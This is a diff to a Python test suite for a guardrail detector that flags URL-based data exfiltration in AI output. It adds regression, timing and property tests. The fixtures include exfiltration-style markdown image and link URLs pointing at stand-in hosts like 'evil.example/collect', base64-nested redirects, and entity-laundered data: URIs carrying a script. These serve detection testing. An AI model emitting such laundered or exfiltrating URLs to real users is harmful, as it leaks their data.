@@ -17,10 +17,13 @@ from __future__ import annotations
 import ast
 import base64
 import re
+import time
 from collections.abc import Callable
 from pathlib import Path
 
 import pytest
+from hypothesis import example, given
+from hypothesis import strategies as st
 
 from jamjet_guardrails._decode import decode
 from jamjet_guardrails.detectors import build, url_exfiltration
@@ -279,6 +282,224 @@ def test_the_check_carries_no_host_list_anywhere_in_its_code() -> None:
 
 
 # ==========================================================================
+# The two fail-opens a whole-branch review found after this check shipped,
+# and the cost of the pass that finds the URLs in the first place.
+# ==========================================================================
+
+
+def test_a_url_whose_authority_ends_at_the_question_mark_still_has_a_query() -> None:
+    """`https://host?q=...` carries no path, RFC 3986 permits it and every
+    browser resolves it to `https://host/?q=...`.
+
+    `_url_parts` used to look for the query only inside what followed the first
+    `/`, so an authority not followed by one swallowed the whole query string
+    and the authority is then discarded. Three of the five signals read nothing
+    but the components, so deleting ONE character from an attacker's URL took
+    MARKDOWN_IMAGE_EXFIL, LINK_QUERY_PAYLOAD and NESTED_REDIRECT out of the
+    check at once. No case in the 88-case corpus put a `?` before the first `/`,
+    so the published row could not see it; `url-0089`, `url-0090` and `url-0091`
+    are what it costs now.
+
+    Mutation watched: `_AUTHORITY_END` narrowed from `[/?]` to `[/]`, which is
+    the parse this replaced. FAILS on the first assertion, and on all four
+    signal assertions.
+    """
+    assert url_exfiltration._url_parts("https://a.example?d=abc") == ([], ["d", "abc"])
+    assert url_exfiltration._url_parts("https://a.example/?d=abc") == ([], ["d", "abc"])
+    assert url_exfiltration._url_parts("https://a.example?d=abc#f") == ([], ["d", "abc"])
+
+    payload = PROSE.replace(" ", "%20")
+    inner = base64.b64encode(b"https://evil.example/collect").decode()
+    for authority in ("https://a.example/p.png", "https://a.example"):
+        assert _types(f"![x]({authority}?d={payload})") == {"MARKDOWN_IMAGE_EXFIL"}
+    for authority in ("https://r.example/go", "https://r.example"):
+        assert _types(f"[l]({authority}?u={inner})") == {"NESTED_REDIRECT"}
+    for authority in ("https://c.example/log", "https://c.example"):
+        entry = LONG.replace(" ", "+")
+        assert _types(f"See [more]({authority}?entry={entry})") == {"LINK_QUERY_PAYLOAD"}
+
+    # The false-reject control. A query is not a finding, and an authority with
+    # no path is the shape half the tracking links on the web have.
+    assert _types("[notes](https://docs.example.com?utm_source=newsletter&page=2)") == set()
+
+
+def test_the_signals_read_the_url_the_consumer_resolves_and_not_only_the_raw_one() -> None:
+    """`_normalised_scheme` unescapes entities before it reads a scheme, and its
+    docstring gives the reason: the HTML parser resolves the reference and the
+    URL parser is handed the result. One line below that call, the data-URI test
+    and the component parse were given the RAW string, so laundering any of the
+    five characters `data:` defeated DATA_URI_PAYLOAD outright, the `_HTTP_SCHEME`
+    gate then dropped the target, and laundering the `?` hid the query string
+    from the three signals that read components.
+
+    The corpus had exactly one entity-laundered case, `url-0019`, and it pinned
+    the normalisation for SCRIPT_SCHEME and for nothing else: a corpus too small
+    to see the bug it was written for. `url-0092`, `url-0093` and `url-0094` are
+    the rest of it.
+
+    Mutation watched: `_consumer_views` reduced to `return (url,)`. FAILS on
+    every laundered assertion below and on none of the controls.
+    """
+    script = "<script>alert(1)</script>"
+    for laundered in ("dat&#97;:", "data&colon;", "dat\ta:"):
+        content = f'<a href="{laundered}text/html,{script}">click</a>'
+        assert _types(content) == {"DATA_URI_PAYLOAD"}, content
+    assert _types(f"[click](dat&#97;:text/html,{script})") == {"DATA_URI_PAYLOAD"}
+    assert _types(f'<a href="data:text/html,{script}">click</a>') == {"DATA_URI_PAYLOAD"}
+
+    payload = PROSE.replace(" ", "%20")
+    assert _types(f"![x](https://a.example/p.png&#63;d={payload})") == {"MARKDOWN_IMAGE_EXFIL"}
+    inner = base64.b64encode(b"https://evil.example/collect").decode()
+    assert _types(f"[l](https://r.example/go&#63;u={inner})") == {"NESTED_REDIRECT"}
+
+    # The raw view is kept as well as the resolved one, in both directions.
+    #
+    # `&amp;` is how every HTML document writes a query separator, and resolving
+    # it SPLITS one component into two: a payload that reads as prose whole can
+    # be two pieces both under the floor. The raw reading is what still sees it.
+    long_half = LONG.replace(" ", "+")
+    split = f'<a href="https://c.example/log?a={long_half}&amp;b=2">go</a>'
+    assert _types(split) == {"LINK_QUERY_PAYLOAD"}
+    # And an ordinary escaped query is still nothing at all.
+    ordinary = '<a href="https://docs.example.com/search?q=deploy&amp;page=2">go</a>'
+    assert _types(ordinary) == set()
+    assert _types(ordinary, IN) == set()
+
+
+def test_a_reference_definition_span_covers_the_url_under_either_delimiter() -> None:
+    """`_strip_delimiters` strips two shapes, `<...>` and a surrounding quote
+    pair, and the offset that put the span back was re-derived beside the call
+    from the angle-bracket shape alone. A quoted URL therefore reported a span
+    that started on the opening quote and stopped one character short of the
+    URL's end: a redaction leaves the last character and the closing quote
+    standing, and the audit record names a region that is not the URL.
+
+    Not a leak, which is why this is the smallest of the three. It is a span
+    this library says it can justify.
+
+    Mutation watched: the quote branch of `_strip_delimiters` changed to return
+    an offset of 0, which is the arithmetic this replaced. FAILS on the quoted
+    case and on nothing else.
+    """
+    url = f"https://evil.example/?d={PROSE.replace(' ', '%20')}"
+    for definition in (url, f"<{url}>", f'"{url}"', f"'{url}'"):
+        content = f"![status][pixel]\n\n[pixel]: {definition}"
+        (finding,) = build("url-exfiltration").check(content, OUT).findings
+        span = finding.span
+        assert span is not None, definition
+        assert content[span[0] : span[1]] == url, definition
+
+
+def test_finding_the_urls_is_linear_in_the_content_and_was_not() -> None:
+    """Two independent quadratic sites in one pass, both found by measurement
+    after the check shipped and after `docs/performance.md` published 112 ms for
+    a megabyte with a sentence written to foreclose exactly this shape.
+
+    The published row could not see either one. Its seeded input carries no URL
+    and no tag, so what it timed was the discovery pass over content with
+    nothing in it to discover.
+
+    - The containment test that stops a bare URL being reported twice was a
+      linear scan of every construct already found, run once per bare URL:
+      O(bare urls x constructs). A megabyte of `[a](b) http://x.example/ ` took
+      37.9 seconds.
+    - The lazy `[^>]*?` joining `<img` to its `src=` rescanned to the end of the
+      content from every tag opener that never reached one. 100 KB of `<img `
+      took 9.4 seconds and a megabyte took 37.3.
+
+    They take 0.215 and 0.011 seconds now, and both curves are 4.0x per 4x. The
+    second payload is 100 KB rather than a megabyte only so that the mutation
+    below finishes: the quadratic form needs a quarter of an hour on a megabyte
+    of tags, and a guard nobody can afford to watch fail is a guard nobody
+    watched fail.
+
+    Each budget is over 20x the measured time and under a fifth of what the
+    quadratic form needed at the same size, following the same reasoning as
+    `tests/test_pii.py::test_the_email_pattern_does_not_degrade_quadratically`:
+    loose enough not to flake on a loaded runner, and nowhere near loose enough
+    to let either shape back in. It is not a performance gate. `docs/performance.md`
+    says why there is no such thing here.
+
+    Mutation watched: `_targets` restored to `if any(low <= start and end <= high
+    for low, high in covered)`. FAILS on the first budget, at 34 seconds.
+    Separately, `_html_attributes` replaced by a `finditer` over the
+    single-regex form it took the place of, which is the one kept below this
+    test. FAILS on the second budget, at 9.4 seconds.
+    """
+    guardrail = build("url-exfiltration")
+
+    mixed = "[a](b) http://x.example/ " * 41_943
+    assert len(mixed) > 1_000_000
+    start = time.perf_counter()
+    assert guardrail.check(mixed, IN).decision == "allow"
+    elapsed = time.perf_counter() - start
+    assert elapsed < 5.0, f"markdown plus bare URLs took {elapsed:.2f}s over {len(mixed)} chars"
+
+    tags = "<img " * 20_000
+    assert len(tags) == 100_000
+    start = time.perf_counter()
+    assert guardrail.check(tags, IN).decision == "allow"
+    elapsed = time.perf_counter() - start
+    assert elapsed < 2.0, f"unterminated tags took {elapsed:.2f}s over {len(tags)} chars"
+
+
+_HTML_IMG_ONE_REGEX = re.compile(
+    r"<img\b[^>]*?\bsrc\s*=\s*(\"[^\"]*\"|'[^']*'|[^\s>]+)", re.IGNORECASE
+)
+_HTML_A_ONE_REGEX = re.compile(
+    r"<a\b[^>]*?\bhref\s*=\s*(\"[^\"]*\"|'[^']*'|[^\s>]+)", re.IGNORECASE
+)
+
+
+# Tag soup, in the pieces a tag is made of rather than one character at a time:
+# a character alphabet reaches `<img src=` only by accident, and it is the
+# pieces that make the two implementations disagree.
+_TAG_SOUP = st.lists(
+    st.sampled_from(["<", ">", '"', "'", " ", "=", "/", "a", "img", "src", "href", "x", "\n"]),
+    max_size=20,
+).map("".join)
+
+
+@given(_TAG_SOUP)
+@example('<img <img src="x">')
+@example('<img alt="a>b" src="x">')
+@example('<a href="x" href="y">')
+@example("<img src=x src=y>")
+@example("<img>src=x")
+@example("<a\nhref='x'>")
+@example("<img src=")
+@example('<img src="unterminated')
+def test_the_linear_attribute_join_answers_what_the_one_regex_answered(content: str) -> None:
+    """The rewrite that killed the second quadratic site has to be the same
+    FUNCTION, not merely a faster one, because these spans are what a redaction
+    covers and what an audit record names.
+
+    So the regex it replaced is kept here and both are run over generated tag
+    soup: same tag starts, same attribute spans, same order, same non-overlap.
+    A property rather than a case list, for the reason
+    `tests/test_properties.py` gives at its own: every Critical this package has
+    recorded was a class of input nobody wrote down.
+
+    Mutation watched: the `bisect_left(opens, resume)` term dropped from the
+    index in `_html_attributes`, which is the non-overlap rule. FAILS on
+    `<img src=x src=y>`.
+    """
+    closes = [match.start() for match in url_exfiltration._HTML_CLOSE.finditer(content)]
+    for opener, attribute, reference in (
+        (url_exfiltration._HTML_OPEN_IMG, url_exfiltration._HTML_SRC, _HTML_IMG_ONE_REGEX),
+        (url_exfiltration._HTML_OPEN_A, url_exfiltration._HTML_HREF, _HTML_A_ONE_REGEX),
+    ):
+        linear = [
+            (tag, match.span(1), match.group(1))
+            for tag, match in url_exfiltration._html_attributes(content, opener, attribute, closes)
+        ]
+        regex = [
+            (match.start(), match.span(1), match.group(1)) for match in reference.finditer(content)
+        ]
+        assert linear == regex, content
+
+
+# ==========================================================================
 # The refusals: every configuration that would check less than it says.
 # ==========================================================================
 
@@ -442,8 +663,8 @@ def _f1_with_prose_floor(attribute: str, value: int) -> float:
 @pytest.mark.parametrize(
     ("attribute", "value", "plateau_top", "below", "above"),
     [
-        ("_IMAGE_PROSE_FLOOR", 30, 64, 0.9014, 0.8986),
-        ("_LINK_PROSE_FLOOR", 136, 176, 0.9014, 0.8308),
+        ("_IMAGE_PROSE_FLOOR", 30, 64, 0.9114, 0.9091),
+        ("_LINK_PROSE_FLOOR", 136, 176, 0.9114, 0.8493),
     ],
 )
 def test_each_prose_floor_is_the_smallest_value_reaching_the_best_f1(
@@ -457,7 +678,7 @@ def test_each_prose_floor_is_the_smallest_value_reaching_the_best_f1(
     link case, at the shipped-value assertion.
     """
     assert getattr(url_exfiltration, attribute) == value
-    baseline = 0.9143
+    baseline = 0.9231
     assert _f1_with_prose_floor(attribute, value) == baseline
     assert _f1_with_prose_floor(attribute, plateau_top) == baseline
     assert _f1_with_prose_floor(attribute, value - 1) == below
@@ -472,7 +693,7 @@ def test_rot13_buys_two_positives_and_costs_no_precision(
     Rot13 is the one alphabet with nothing to recognise it by, so it was shipped
     on a measurement rather than on an argument: removing it from the readings
     this check takes of a URL component, with nothing else changed, loses two
-    true positives and returns no precision, over 53 negatives that are almost
+    true positives and returns no precision, over 55 negatives that are almost
     entirely ordinary English and therefore rot13 candidates every one.
 
     Mutation watched: `_decode_rot13` changed to `return None`. FAILS on the
@@ -492,7 +713,7 @@ def test_rot13_buys_two_positives_and_costs_no_precision(
         round(shipped.overall.recall, 4),
         shipped.overall.false_positives,
         shipped.decision_mismatches,
-    ) == (0.9143, 0.9143, 3, 6)
+    ) == (0.9231, 0.9231, 3, 6)
 
     original = url_exfiltration._readings
 
@@ -509,7 +730,7 @@ def test_rot13_buys_two_positives_and_costs_no_precision(
         round(ablated.overall.recall, 4),
         ablated.overall.false_positives,
         ablated.decision_mismatches,
-    ) == (0.9091, 0.8571, 3, 8)
+    ) == (0.9189, 0.8718, 3, 8)
 
     lost = {f.case_id for f in ablated.failures} - {f.case_id for f in shipped.failures}
     assert lost == {"url-0071", "url-0072"}
